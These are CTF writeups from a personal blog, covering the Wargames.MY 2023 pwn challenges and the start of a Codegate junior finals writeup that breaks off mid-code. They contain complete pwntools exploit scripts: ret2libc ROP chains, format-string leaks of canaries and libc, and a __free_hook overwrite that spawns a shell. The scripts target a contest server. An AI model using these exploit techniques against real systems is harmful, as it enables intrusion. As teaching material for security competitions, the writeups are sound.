[{"content":"Overview I played in Wargames.MY 2023 ctf as a solo player, and managed to get first blood on all three of the pwn challs, as well as solve 1 ppc chall. Wargames.MY is pretty much the most famous Malaysian ctf currently, and some of my Malaysian ctf friends were talking to me about it, so I decided to give it a try.\nAll attachments can be found here\nMagic Door (pwn) checksec:\n[*] \u0026#39;/home/vagrant/ctf/wgmy23/magic_door/magic_door\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3fe000) src.c void open_the_door(void){ int iVar1; char local_18 [12]; int local_c; initialize(); puts(\u0026#34;Welcome to the Magic Door !\u0026#34;); printf(\u0026#34;Which door would you like to open? \u0026#34;); __isoc99_scanf(\u0026#34;%11s\u0026#34;,local_18); getchar(); iVar1 = strcmp(local_18,\u0026#34;50015\u0026#34;); if (iVar1 == 0) { no_door_foryou(); } else { local_c = atoi(local_18); if (local_c == 50015) { magic_door(50015); } else { no_door_foryou(); } } return; } void magic_door(void){ undefined8 local_48; undefined8 local_40; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; undefined8 local_18; undefined8 local_10; local_48 = 0; local_40 = 0; local_38 = 0; local_30 = 0; local_28 = 0; local_20 = 0; local_18 = 0; local_10 = 0; puts(\u0026#34;Congratulations! You opened the magic door!\u0026#34;); puts(\u0026#34;Where would you like to go? \u0026#34;); fgets((char *)\u0026amp;local_48,0x100,stdin); return; } There is an obvious buffer overflow in the magic_door function, and since stack canary is disabled, a simple ret2libc will allow us to get a shell pretty quickly.\nThe tricky part is actually getting to the magic_door function call.\nThe program first asks which door you would like to open, and exits if you enter 50015. However, the program later checks to see if the door you want to open is 50015, and exits if its not.\nSo in other words, you can\u0026rsquo;t enter 50015, but you HAVE to enter 50015.\nSo how can you get past that? Negative numbers!\nIn memory, negative integers are stored in two\u0026rsquo;s complement form.\nSo -1 would be stored as 0xffffffff, -2 would be stored as 0xfffffffe, and so on.\nSo essentially,\n-a in memory: 0x100000000 - a So if we want 50015 to be in local_c, one way is we can enter 50015, and the other is by entering -(0x100000000-50015), which is -4294917281. This is so that the two\u0026rsquo;s complement of 4294917281, which is 0x100000000-4294917281=50015, will be stored in memory!\nThis way, we can pass both checks and get into the magic_door function.\nTo learn more about negative numbers in memory, you can look at this liveoverflow video or read this wikipedia page\nAfter getting into the magic_door function, I just made a rop that leaks puts@got to leak libc, and then restart the program. Then I just used a ret2libc to get a shell.\nThe libc version that the server uses isn\u0026rsquo;t given in the handout, so in order to find it (so that I can accurately calculate function offsets correctly in my exploit), I leaked the puts@libc and printf@libc addresses on remote using puts@got and printf@got, and then used a libc database search to find the correct libc version\nexploit.py from pwn import * #io = process(\u0026#34;./magic_door\u0026#34;,aslr=False) io = remote(\u0026#34;13.229.222.125\u0026#34;,32837) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) # gadgets entry = p64(0x401190) popRdi = p64(0x401434) putsPlt = p64(0x4010e0) putsGot = p64(0x404018) ret = p64(0x401388) io.sendlineafter(b\u0026#34;Which door would you like to open?\u0026#34;,b\u0026#34;-4294917281\u0026#34;) # leak libc and restart binary rop = b\u0026#34;A\u0026#34;*0x48 rop += popRdi + putsGot + putsPlt + entry io.sendlineafter(b\u0026#34;Where would you like to go?\u0026#34;,rop) io.recv() libc.address = u64(io.recv(6).ljust(8,b\u0026#34;\\x00\u0026#34;)) - libc.symbols[\u0026#34;puts\u0026#34;] log.info(\u0026#34;LIBC BASE: \u0026#34; + hex(libc.address)) io.sendlineafter(b\u0026#34;Which door would you like to open?\u0026#34;,b\u0026#34;-4294917281\u0026#34;) # I have to add a ret gadget to my rop to make the stack 64 bit aligned to prevent the movaps issue # more on that here: https://ropemporium.com/guide.html rop = b\u0026#34;A\u0026#34;*0x48 rop += ret + popRdi + p64(next(libc.search(b\u0026#34;/bin/sh\u0026#34;))) + p64(libc.symbols[\u0026#34;system\u0026#34;]) io.sendlineafter(b\u0026#34;Where would you like to go?\u0026#34;,rop) io.interactive() Pak Mat Burger (pwn) checksec:\n[*] \u0026#39;/home/vagrant/ctf/wgmy23/pakmat_burger/pakmat_burger\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled src.c char * main(void){ int iVar1; char *secret; long in_FS_OFFSET; char local_3e [9]; char local_35 [10]; char name [12]; undefined local_1f [15]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); initialize(); secret = getenv(\u0026#34;SECRET_MESSAGE\u0026#34;); if (secret == (char *)0x0) { puts(\u0026#34;Error: SECRET_MESSAGE environment variable not set. Exiting...\u0026#34;); secret = (char *)0x1; } else { puts(\u0026#34;Welcome to Pak Mat Burger!\u0026#34;); printf(\u0026#34;Please enter your name: \u0026#34;); __isoc99_scanf(\u0026#34;%11s\u0026#34;,name); printf(\u0026#34;Hi \u0026#34;); printf(name); printf(\u0026#34;, to order a burger, enter the secret message: \u0026#34;); __isoc99_scanf(\u0026#34;%8s\u0026#34;,local_3e); iVar1 = strcmp(local_3e,secret); if (iVar1 == 0) { puts(\u0026#34;Great! What type of burger would you like to order? \u0026#34;); __isoc99_scanf(\u0026#34;%14s\u0026#34;,local_1f); getchar(); printf(\u0026#34;Please provide your phone number, we will delivered soon: \u0026#34;); secret = fgets(local_35,100,stdin); } else { puts(\u0026#34;Sorry, the secret message is incorrect. Exiting...\u0026#34;); secret = (char *)0x0; } } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return secret; } There are two obvious vulnerabilities here, a format string vuln, and a buffer overflow vuln. Let\u0026rsquo;s look at the rest of the program first to see what we\u0026rsquo;re dealing with.\nThe program first gets the secret from an environment variable SECRET_MESSAGE\nwhen testing locally, use export SECRET_MESSAGE=\u0026quot;...\u0026quot; to set the SECRET_MESSAGE environment variable\nLater on, the program asks for your name, and directly calls printf on it (this is where the format string vuln is). It then asks for the secret, and if you correctly input the secret, you get to write what type of burger you want, and your phone number (this is where the buffer overflow vuln is).\nSince we can control the first argument of a printf(.,.,.) call, it means that we can use \u0026quot;%1$p\u0026quot; to print the second arg, and \u0026quot;%2$p\u0026quot; to print the third arg, and so on and so forth\nSo let\u0026rsquo;s see what we can leak using the format string vuln by breaking at the printf call and looking at the arguments.\nI set the SECRET_MESSAGE env variable to \u0026ldquo;1337\u0026rdquo; locally\nBreakpoint 1, 0x000055555555542a in main () [ Legend: Modified register | Code | Heap | Stack | String ] ──────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $rax : 0x0 $rbx : 0x0 $rcx : 0x00007ffff7ea7a77 → 0x5177fffff0003d48 (\u0026#34;H=\u0026#34;?) $rdx : 0x0 $rsp : 0x00007fffffffe290 → 0x00007fffffffee15 → 0x4744580037333331 (\u0026#34;1337\u0026#34;?) $rbp : 0x00007fffffffe2d0 → 0x0000000000000001 $rsi : 0x00007fffffffc170 → \u0026#34;Hi ase enter your name: \u0026#34; $rdi : 0x00007fffffffe2ad → 0x0000000000007025 (\u0026#34;%p\u0026#34;?) $rip : 0x000055555555542a → \u0026lt;main+182\u0026gt; call 0x555555555150 \u0026lt;printf@plt\u0026gt; $r8 : 0x3 $r9 : 0x0 $r10 : 0x00005555555560a8 → 0x0000000000206948 (\u0026#34;Hi \u0026#34;?) $r11 : 0x246 $r12 : 0x00007fffffffe3e8 → 0x00007fffffffe650 → \u0026#34;/home/vagrant/ctf/wgmy23/pakmat_burger/pakmat_burg[...]\u0026#34; $r13 : 0x0000555555555374 → \u0026lt;main+0\u0026gt; endbr64 $r14 : 0x0000555555557d50 → 0x0000555555555280 → \u0026lt;__do_global_dtors_aux+0\u0026gt; endbr64 $r15 : 0x00007ffff7ffd040 → 0x00007ffff7ffe2e0 → 0x0000555555554000 → jg 0x555555554047 $eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffe290│+0x0000: 0x00007fffffffee15 → 0x4744580037333331 (\u0026#34;1337\u0026#34;?) ← $rsp 0x00007fffffffe298│+0x0008: 0x0000000000000000 0x00007fffffffe2a0│+0x0010: 0x0000000000000000 0x00007fffffffe2a8│+0x0018: 0x0070250000000000 0x00007fffffffe2b0│+0x0020: 0x0000000000000000 0x00007fffffffe2b8│+0x0028: 0x0000000000000000 0x00007fffffffe2c0│+0x0030: 0x0000000000000000 0x00007fffffffe2c8│+0x0038: 0x4b9505916e213c00 ────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──── 0x55555555541e \u0026lt;main+170\u0026gt; lea rax, [rbp-0x23] 0x555555555422 \u0026lt;main+174\u0026gt; mov rdi, rax 0x555555555425 \u0026lt;main+177\u0026gt; mov eax, 0x0 → 0x55555555542a \u0026lt;main+182\u0026gt; call 0x555555555150 \u0026lt;printf@plt\u0026gt; ↳ 0x555555555150 \u0026lt;printf@plt+0\u0026gt; endbr64 0x555555555154 \u0026lt;printf@plt+4\u0026gt; bnd jmp QWORD PTR [rip+0x2e25] # 0x555555557f80 \u0026lt;printf@got.plt\u0026gt; 0x55555555515b \u0026lt;printf@plt+11\u0026gt; nop DWORD PTR [rax+rax*1+0x0] 0x555555555160 \u0026lt;alarm@plt+0\u0026gt; endbr64 0x555555555164 \u0026lt;alarm@plt+4\u0026gt; bnd jmp QWORD PTR [rip+0x2e1d] # 0x555555557f88 \u0026lt;alarm@got.plt\u0026gt; 0x55555555516b \u0026lt;alarm@plt+11\u0026gt; nop DWORD PTR [rax+rax*1+0x0] ────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ──── printf@plt ( $rdi = 0x00007fffffffe2ad → 0x0000000000007025 (\u0026#34;%p\u0026#34;?), $rsi = 0x00007fffffffc170 → \u0026#34;Hi ase enter your name: \u0026#34;, $rdx = 0x0000000000000000 ) So since this is an x86_64 binary, we are following the x86_64 calling convention.\n1st arg: stored in rdi 2nd arg: stored in rsi 3rd arg: stored in rdx 4th arg: stored in rcx 5th arg: stored in r8 6th arg: stored in r9 7th,8th,9th,... arg: stored at the top of the stack to learn more abt this and also see how C programs work in assembly, watch this liveoverflow video\nSo looking at the gdb output, we can see that the secret is stored at the top of the stack, which can be accessed by accesing the 7th argument of the printf call. Since \u0026quot;%1$p\u0026quot; refers to the second argument, we can use \u0026quot;%6$s\u0026quot; to leak the secret.\nAfter connecting to the server and leaking the secret multiple times, it can be seen that the secret stays the same through all connections. So you just have to leak it once, and you won\u0026rsquo;t have to leak it again in your following exploits.\nthe secret is e31c8306 btw\nSo cool! Now we can leak the secret. Well, what else can we leak? Let\u0026rsquo;s continue examining the stack.\ngef➤ tele 0x00007fffffffe290 0x00007fffffffe290│+0x0000: 0x00007fffffffee15 → 0x4744580037333331 (\u0026#34;1337\u0026#34;?) ← $rsp 0x00007fffffffe298│+0x0008: 0x0000000000000000 0x00007fffffffe2a0│+0x0010: 0x0000000000000000 0x00007fffffffe2a8│+0x0018: 0x0070250000000000 0x00007fffffffe2b0│+0x0020: 0x0000000000000000 0x00007fffffffe2b8│+0x0028: 0x0000000000000000 0x00007fffffffe2c0│+0x0030: 0x0000000000000000 0x00007fffffffe2c8│+0x0038: 0x4b9505916e213c00 0x00007fffffffe2d0│+0x0040: 0x0000000000000001 ← $rbp 0x00007fffffffe2d8│+0x0048: 0x00007ffff7dbcd90 → mov edi, eax gef➤ canary [+] The canary of process 22462 is at 0x7ffff7d90768, value is 0x4b9505916e213c00 It seems like we can leak both the canary, and the libc using the format string vuln.\nDoing some simple counting, we find out that %13$p can be used to leak the canary, and %15$p can be used to leak a libc address, which we can use to calculate the libc base, and later on calculate the address of system@libc and the \u0026quot;/bin/sh\u0026quot; string in libc.\nI assumed that the libc used would be the same as the previous challenge, and it was indeed the same.\nSince we know the canary, we can easily bypass the canary check.\nAnd since we know the libc base address, we can just do a ret2libc with the buffer overflow.\nexploit.py from pwn import * #io = process(\u0026#34;pakmat_burger\u0026#34;,aslr=False) io = remote(\u0026#34;13.229.222.125\u0026#34;,32874) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) #secret = b\u0026#34;1337\u0026#34; secret = b\u0026#34;e31c8306\u0026#34; io.sendlineafter(b\u0026#34;Please enter your name:\u0026#34;,b\u0026#34;%15$p%13$p\u0026#34;) io.recvuntil(b\u0026#34;Hi \u0026#34;) libc.address = int(io.recv(14).decode(),16) - 128 - 171280 log.info(\u0026#34;LIBC BASE: \u0026#34; + hex(libc.address)) canary = int(io.recv(18).decode(),16) log.info(\u0026#34;CANARY: \u0026#34; + hex(canary)) #gdb.attach(io,gdbscript=\u0026#34;break *0x5555555554fe\u0026#34;) io.sendlineafter(b\u0026#34;enter the secret message:\u0026#34;,secret) io.sendlineafter(b\u0026#34;order?\u0026#34;,b\u0026#34;abcd\u0026#34;) # gadgets found in libc popRdi = p64(libc.address + 0x2a3e5) ret = p64(libc.address + 0x2a3e6) rop = b\u0026#34;A\u0026#34;* 37 + p64(canary) + b\u0026#34;A\u0026#34;*8 rop += ret + popRdi + p64(next(libc.search(b\u0026#34;/bin/sh\u0026#34;))) + p64(libc.symbols[\u0026#34;system\u0026#34;]) io.sendlineafter(b\u0026#34;soon:\u0026#34;,rop) io.interactive() Free Juice (pwn) checksec:\n[*] \u0026#39;/home/vagrant/ctf/wgmy23/free_juice/free_juice\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled src.c undefined8 main(void){ int local_c; initialize(); do { displayMenu(); printf(\u0026#34;Enter your choice: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;,\u0026amp;local_c); if (local_c == 3) { drinkJuices(); } else { if (local_c \u0026lt; 4) { if (local_c == 1) { chooseJuices(); } else { if (local_c == 2) { refillJuices(); } else { LAB_00100fff: puts(\u0026#34;Invalid choice. Please try again.\u0026#34;); } } } else { if (local_c == 4) { puts(\u0026#34;Exiting...\u0026#34;); } else { if (local_c != 0x539) goto LAB_00100fff; secretJuice(); } } } if (local_c == 4) { return 0; } } while( true ); } void chooseJuices(void){ int local_c; displayAvailableJuices(); printf(\u0026#34;Enter the number of the chosen juice (1-5): \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;,\u0026amp;local_c); if ((local_c \u0026lt; 1) || (5 \u0026lt; local_c)) { puts(\u0026#34;Invalid selection. Please try again.\u0026#34;); } else { chosenJuice = malloc(0x114); if (chosenJuice == (char *)0x0) { perror(\u0026#34;Error allocating memory\u0026#34;); exit(1); } strcpy(chosenJuice,availableJuices + (long)(local_c + -1) * 0x114); *(chosenJuice + 0x100) = *(\u0026amp;DAT_00302120 + (long)(local_c + -1) * 0x114); strcpy(chosenJuice + 0x104,s_Orange_00302124 + (long)(local_c + -1) * 0x114); printf(\u0026#34;You chose %s juice.\\n\u0026#34;,chosenJuice); } return; } void displayAvailableJuices(void){ int local_c; puts(\u0026#34;Available Juices:\u0026#34;); local_c = 0; while (local_c \u0026lt; 5) { printf(\u0026#34;%d. %s\\n\u0026#34;,(ulong)(local_c + 1),availableJuices + (long)local_c * 0x114); local_c = local_c + 1; } return; } void refillJuices(void){ if (chosenJuice == 0) { puts(\u0026#34;Please choose a juice first.\u0026#34;); } else { printf(\u0026#34;Enter the quantity to refill: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;,chosenJuice + 0x100); puts(\u0026#34;Juice refilled!\u0026#34;); } return; } void drinkJuices(void){ if (chosenJuice == (void *)0x0) { puts(\u0026#34;Please choose a juice first.\u0026#34;); } else { puts(\u0026#34;Enjoy the refreshing experience of your chosen juice. Cheers! \u0026#34;); putchar(10); free(chosenJuice); chosenJuice = (void *)0x0; } return; } void secretJuice(void){ // option 1337 long in_FS_OFFSET; char local_118 [264]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); if (chosenJuice == (char *)0x0) { puts(\u0026#34;Please choose a juice first.\u0026#34;); } else { puts(\u0026#34;Let us know what juices you need and we will get back to you!\u0026#34;); __isoc99_scanf(\u0026#34;%256s\u0026#34;,local_118); printf(\u0026#34;Current Juice : \u0026#34;); printf(local_118); strncpy(chosenJuice,local_118,0xff); chosenJuice[0xff] = \u0026#39;\\0\u0026#39;; putchar(10); } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return; } libc-2.23.so is given for this chall\nThis looks like a classic heap pwn challange.\nYou can essentially 1. allocate 0x120 chunks 2. free the chunk above wilderness 3. overflow the chunk above wilderness, and leak stuff using option 1337 The only tricky part of this challenge is that you can\u0026rsquo;t free whichever chunk you want, you can only free the chunk above wilderness, which makes us essentially not be able to put any chunk into the bins, since the chunk will consolidate with the wilderness when it is freed.\nThese conditions and the libc version made me think of House of Orange. Also, the challenge context, specifically \u0026ldquo;Orange juice\u0026rdquo;, confirmed my assumption that the intended solution requires a House of Orange attack.\nWe also have all the requirements needed to perform a House of Orange attack.\n1. we have a heap overflow that can overwrite the top chunk 2. we have a libc and heap infoleak using the format string vuln As I was thinking of how to execute this attack on this challenge, it suddenly came to me, that I can actually just pwn this binary by solely using the format string vuln. I mean think about it, we can use option 1337 as many times as we want, meaning that we can use the format string vuln as many times as we want, meaning we have unlimited arbitary overwrites.\nfor a short minute I thought this exploit wouldn\u0026rsquo;t work since it reads in strings and I can\u0026rsquo;t write the packed 64 bit address as it contains null bytes, but then I realised you could just put the address at the end of the format string payload. lol\nWhat I did in the end was just leaking libc, and then overwriting __free_hook with system@libc, and writing \u0026quot;/bin/sh\u0026quot; into my juice, and freeing it.\nexploit.py from pwn import * #io = process(\u0026#34;./free_juice\u0026#34;) io = remote(\u0026#34;13.229.222.125\u0026#34;,33156) libc = ELF(\u0026#34;./libc-2.23.so\u0026#34;) def chooseJuice(): io.sendlineafter(b\u0026#34;Enter your choice:\u0026#34;,b\u0026#34;1\u0026#34;) io.sendlineafter(b\u0026#34;(1-5):\u0026#34;,b\u0026#34;1\u0026#34;) def secretJuice(a): io.sendlineafter(b\u0026#34;Enter your choice:\u0026#34;,b\u0026#34;1337\u0026#34;) io.sendlineafter(b\u0026#34;you!\u0026#34;,a) def drinkJuice(): io.sendlineafter(b\u0026#34;Enter your choice:\u0026#34;,b\u0026#34;3\u0026#34;) chooseJuice() # leak libc secretJuice(b\u0026#34;%13$p\u0026#34;) io.recvuntil(b\u0026#34;: \u0026#34;) libc.address = int(io.recv(14).decode(),16) - 271 - libc.symbols[\u0026#34;__isoc99_scanf\u0026#34;] log.info(\u0026#34;LIBC BASE: \u0026#34; + hex(libc.address)) # cheese the chall # overwrite __free_hook with system system = p64(libc.symbols[\u0026#34;system\u0026#34;])[:-2] freehook = libc.symbols[\u0026#34;__free_hook\u0026#34;] log.info(\u0026#34;system@libc: \u0026#34; + hex(libc.symbols[\u0026#34;system\u0026#34;])) log.info(\u0026#34;__free_hook: \u0026#34; + hex(libc.symbols[\u0026#34;__free_hook\u0026#34;])) for i in system: formatstr = b\u0026#34;%\u0026#34; + str(i).rjust(3,\u0026#34;0\u0026#34;).encode() + b\u0026#34;c\u0026#34; formatstr += b\u0026#34;%8$hhn\u0026#34; formatstr = formatstr.ljust(16,b\u0026#34;A\u0026#34;) formatstr += p64(freehook)[:-2] secretJuice(formatstr) freehook += 1 secretJuice(b\u0026#34;/bin/sh;\u0026#34;) drinkJuice() io.interactive() Alternative solutions I\u0026rsquo;m pretty sure that the intended solution for this chall is to use a House of Orange attack, so I think I kinda cheesed it lol. But granted that the heap overflow primitive is so strong, and we can leak everything we want, I think the execution of the attack should be quite straighforward, and can be done by just following the how2heap House of Orange writeup.\nthe only part you have to change from the how2heap writeup is prob just the part where it calculates the new wilderness size.\nOther ways that I think this chall could be solved:\nAbusing exit handlers (more on this on my previous blog post, and this article) Overwriting the jump table ptr in stdin/stdout/stderr. (I\u0026rsquo;m pretty sure this will work since the mitigation that checks the address of the vtable before virtual functions are called is added in gilbc 2.24) Copying the exploit strategy of House of Orange, and forge a fake _IO_FILE struct, place it in _IO_list_all using format string vuln, and cause malloc_printerr to run Linux Memory Usage (ppc) The problem simplified was essentially (worded by myself):\nYou are given N processes, and you are given its 1. pid 2. ppid 3. memory used For each query, you have to give the total memory used by the process, which is its own memory used plus all the memory used by its children My approach is quite straightforward.\nI made a Process class in cpp, which had the properties pid,ppid,mem, and children, which is a vector. I also made a hashmap to store all the Process objects.\nThe Process class also has a recursive method called Process.memUsed(), which adds up its own mem used with all the mem its children used. To find the mem used by its children, child.memUsed() is called (which is why I say the method is recursive)\nHowever, this solution isn\u0026rsquo;t fast enough, and will exceed the limit.\nSo to solve this, I made a new property in the Process class called totalmem, and store the value calculated by Process.memUsed() in it. This way if memUsed() is called upon the same Process object multiple times, the method won\u0026rsquo;t have to repeatedly find out the total memory, and can just use the value stored in totalmem.\nsolve.cpp #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; class Process { public: int pid; int ppid; int mem; int totalmem = 0; vector\u0026lt;Process*\u0026gt; children; Process(){ pid = 0; ppid = 0; mem = 0; } Process(int a, int b, int c){ pid = a; ppid = b; mem = c; } int memUsed(){ if (totalmem != 0){ // this has alr been calculated return totalmem; } int total = mem; for (Process* child : children){ total += child-\u0026gt;memUsed(); } totalmem = total; return total; } }; int main(){ int n,q; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; q; int a,b,c; unordered_map \u0026lt;int,Process*\u0026gt; hashmap; for (int i = 0; i \u0026lt; n; i++) { cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b \u0026gt;\u0026gt; c; Process *current = new Process(a,b,c); hashmap.insert({a,current}); if (b != 0) hashmap[b]-\u0026gt;children.push_back(current); } int pid; for (int i = 0; i \u0026lt; q; i++){ cin \u0026gt;\u0026gt; pid; cout \u0026lt;\u0026lt; hashmap[pid]-\u0026gt;memUsed() \u0026lt;\u0026lt; endl; } return 0; } Conclusion Overall, I think its not a bad ctf for ctf beginners (for pwn at least) since the challs aren\u0026rsquo;t too easy and aren\u0026rsquo;t rly that hard, so beginners will actually feel challenged when solving them, but will be able to solve them and learn a lot along the way if they do enough research and well, spend enough time on them. And even if they don\u0026rsquo;t solve them, a lot is still learned in the end, which at the end of the day, is still a huge W.\nThe organisers said that they tried to up the difficulty of the challenges this year compared to last year so that Malaysia students can improve and can compete in the international level and tbh I think that\u0026rsquo;s great! Respect to the organisers for trying to build up the Malaysian ctf scene and I wish nothing but the best for them. Hope that I can do the same and help build the Malaysian ctf community in some way in the future as well.\nHope that there are more pwn challs next year tho since there were like 8 web challs and only 3 pwn challs. I couldn\u0026rsquo;t rly do anything else after blooding the pwn challs and solving the ppc chall since I\u0026rsquo;m too noob at crypto and rev, and I hate dislike doing web (ig this is a personal skill issue). But all in all, gg!\n","permalink":"https://zeynarz.github.io/posts/wgmy23/","summary":"writeups for wargames.my 2023 pwn (and 1 ppc) challs","title":"Wargames.MY 2023"},{"content":"Overview Last week, I traveled to Seoul, Korea to compete in this year\u0026rsquo;s codegate junior finals, and I finished at 8th out of 20 finalists.\nI managed to solve 2 pwns and 1 crypto chall, and this blog post will contain the writeups for all three of them. All attachments can be found here.\nBackstory you can skip this part and go straight to the writeups if you\u0026rsquo;d like to\nThe top 20 players from the codegate junior qualifiers were invited to the finals. I performed very badly in the qualifiers, and if I remember correctly I actually was 27th right before the ctf ended. I was pretty dissapointed in myself after the ctf cause I specifically told myself to dive into kernel pwn and windows rev before the qualifiers, but I kept being lazy and in the end I didn\u0026rsquo;t really try them out. And guess what, there was an easy kernel pwn chall and easy windows reversing chall in the qualifiers, which would guarantee me a spot in the finals had I solved any one of them, and I ended up solving none of them simply because I had no experience in any of them.\nBy the end of the ctf, I finished at 25th (not because I gained any more points, but because of the whole Hall of Shame thing), and the top 25 players were supposed to send them a writeup. I was pretty devastated at this point but I figured I just quickly write the writeup and send it to them for maybe a slight chance of me being able to go to the finals. I wanted to keep the hope alive.\nAnd to my suprise, I got an email from codegate at the end of June asking if I wanted to go to the finals. I was ecstatic and couldn\u0026rsquo;t believe that I actually got this opportunity. I told myself that this was a chance to redeem myself, and to not make the same mistakes I made before. I aimed for top 3, and practiced and learned as much as I could before the finals.\nIn the end, I got 8th, which is not bad and definitely an improvement, but still I kinda feel like I could\u0026rsquo;ve done a bit better. I was actually 3rd at the last few hours of the ctf, but I guess I didn\u0026rsquo;t push myself hard enough near the end and was a bit too complacent cause I didn\u0026rsquo;t solve anything else afterwards. Had I started working on the misc chall I was working on a bit earlier, maybe I could\u0026rsquo;ve solved it and gotten like top 4. Nevertheless, this was still an incredible experience, and Im very grateful for having this opportunity.\nEnough waffling, time to actually get to the writeups.\nezRSA (crypto) ezRsa.py #!/usr/bin/python3 import os import gmpy2 import random import sys import pathlib from Crypto.PublicKey import RSA def welcome(): text = \u0026#39;\u0026#39;\u0026#39; ,, ,, .M\u0026#34;\u0026#34;\u0026#34;bgd db `7MM `7MM\u0026#34;\u0026#34;\u0026#34;Mq. .M\u0026#34;\u0026#34;\u0026#34;bgd db ,MI \u0026#34;Y MM MM `MM. ,MI \u0026#34;Y ;MM: `MMb. `7MM `7MMpMMMb.pMMMb. `7MMpdMAo. MM .gP\u0026#34;Ya MM ,M9 `MMb. ,V^MM. `YMMNq. MM MM MM MM MM `Wb MM ,M\u0026#39; Yb MMmmdM9 `YMMNq. ,M `MM . `MM MM MM MM MM MM M8 MM 8M\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#34; MM YM. . `MM AbmmmqMA Mb dM MM MM MM MM MM ,AP MM YM. , MM `Mb. Mb dM A\u0026#39; VML P\u0026#34;Ybmmd\u0026#34; .JMML..JMML JMML JMML. MMbmmd\u0026#39;.JMML.`Mbmmd\u0026#39; .JMML. .JMM.P\u0026#34;Ybmmd\u0026#34; .AMA. .AMMA. MM .JMML. \u0026#39;\u0026#39;\u0026#39; print(text) rsa_key = RSA.generate(1024) return rsa_key def get_int_length(num:int): import math return int(math.ceil(num.bit_length() / 8)) def RSAencrypt(plaintext:bytes, e:int, N:int): int_plaintext = int.from_bytes(plaintext, \u0026#39;big\u0026#39;) ciphertext = pow(int_plaintext, e, N) return ciphertext.to_bytes(get_int_length(ciphertext),\u0026#39;big\u0026#39;).hex() def RSAdecrypt(ciphertext:bytes, d:int, N:int): int_ciphertext = int.from_bytes(ciphertext, \u0026#39;big\u0026#39;) message = pow(int_ciphertext, d, N) return message.to_bytes(get_int_length(message), \u0026#39;big\u0026#39;) def action_seeflag(key): flagfile = pathlib.Path(\u0026#34;/home/ctf/flag\u0026#34;) with open (flagfile, \u0026#39;r\u0026#39;) as f: flag = f.read() data = flag.encode().hex().encode() result = RSAencrypt(data, key.e, key.n) print(f\u0026#34;FLAG is {result}\u0026#34;) return def action_encrypt(key:RSA.RsaKey): user_inp = input(\u0026#34;write plain text(hex string format): \u0026#34;) userInput_hex = bytes.fromhex(user_inp) result = RSAencrypt(userInput_hex, key.e, key.n) print(f\u0026#34;[*] Done! Here is!\\n {result}\u0026#34;) return def action_decrypt(key): ciphertext = input(\u0026#34;write ciphertext with hex string format: \u0026#34;) flagfile = pathlib.Path(\u0026#34;/home/ctf/flag\u0026#34;) with open (flagfile, \u0026#39;r\u0026#39;) as f: cmp_flag = f.read() data = cmp_flag.encode().hex().encode() userInput_hex = bytes.fromhex(ciphertext) decrypted_data = RSAdecrypt(userInput_hex, key.d, key.n) if(RSAencrypt(data, key.e, key.n) == ciphertext): print(\u0026#34;Don\u0026#39;t decrypt encrpted flag...\u0026#34;) return print(f\u0026#34;[*] decrypt result =\u0026gt; {decrypted_data.hex()}\u0026#34;) def main(rsakey): action = int(input(\u0026#34;1. encrypt\\n2. decrypt\\n3. see top secret\\n4. exit\\n\u0026gt; \u0026#34;)) if action == 1: action_encrypt(rsakey) elif action == 2: action_decrypt(rsakey) elif action == 3: action_seeflag(rsakey) elif action == 4: print(\u0026#34;byebye!\u0026#34;) sys.exit() else: print(\u0026#34;Invalid input!!\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: initkey = welcome() for _ in range(100000): print(\u0026#34;\\nYou can encrypt / decrypt with my SIMPLE RSA!\u0026#34;) try: main(initkey) except Exception as e: print(e) You can see the encrypted flag, and can encrypt and decrypt any message except for the encrypted flag. A quick google search showed me this writeup.\nSince RSA is malleable, we could produce a ciphertext in a way such that the decrypted plaintext is related to the flag.\nFrom the writeup:\nct_flag = encrypt(flag) = flag^e mod n ct_two = encrypt(2) = 2^e mod n ct_not_flag = ct_flag*ct_two = (flag*2)^e mod n decrypted(ct_not_flag) = flag*2 calc (pwn) checksec:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled note():\nvoid note(void) { ssize_t sVar1; char buf [44]; int local_c; memset(buf,0,0x20); printf(\u0026#34;Note\u0026gt; \u0026#34;); sVar1 = read(0,buf,0x100); local_c = (int)sVar1; if (buf[local_c + -1] == \u0026#39;\\n\u0026#39;) { buf[local_c + -1] = \u0026#39;\\0\u0026#39;; } memcpy(notepad,buf,(long)local_c); printf(\u0026#34;Notepad: %s\\n\u0026#34;,notepad); return; } There is an obvious buffer overflow here. With stack canaries off, we just need a leak of either PIE or libc to just ROP and get shell.\ncalc() void calc(void) { size_t sVar1; undefined8 uVar2; memset(expression,0,0x100); printf(\u0026#34;Formula\u0026gt; \u0026#34;); fgets(expression,0x100,stdin); sVar1 = strlen(expression); if (notepad[sVar1 + 0xff] == \u0026#39;\\n\u0026#39;) { sVar1 = strlen(expression); notepad[sVar1 + 0xff] = 0; } uVar2 = evaluateExpression(); printf(\u0026#34;Result\u0026gt; %ld\\n\u0026#34;,uVar2); return; } long evaluateExpression(void) { // ghidra 